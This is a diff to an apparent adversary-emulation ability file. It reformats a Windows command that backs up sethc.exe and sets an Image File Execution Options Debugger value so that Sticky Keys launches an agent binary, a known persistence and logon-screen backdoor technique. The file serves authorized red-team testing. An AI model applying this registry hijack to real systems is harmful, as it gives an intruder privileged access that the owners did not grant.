@@ -11,11 +11,8 @@ technique:
 platforms:
   windows:
     cmd:
-      command: >-
-        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
-        && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
-        Execution Options\sethc.exe" /v Debugger /t REG_SZ /d
-        "#{agent.location}"
+      command: |
+        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe & reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "#{agent.location}"
 metadata:
   authors:
     - bfuzzy1
